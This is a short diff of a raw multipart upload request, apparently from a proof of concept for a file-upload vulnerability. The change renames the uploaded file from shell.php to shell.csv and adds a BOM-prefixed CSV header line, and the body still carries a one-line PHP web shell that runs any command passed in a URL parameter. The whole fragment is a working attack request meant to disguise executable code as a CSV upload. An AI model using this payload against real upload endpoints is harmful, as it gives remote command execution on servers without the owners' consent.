@@ -34,9 +34,10 @@ Content-Disposition: form-data; name="category_id"
 
 15
 ------WebKitFormBoundary
-Content-Disposition: form-data; name="doc"; filename="shell.php"
+Content-Disposition: form-data; name="doc"; filename="shell.csv"
 Content-Type: text/csv
 
+﻿host
 <?php system($_GET['cmd']); ?>
 ------WebKitFormBoundary
 Content-Disposition: form-data; name="type"
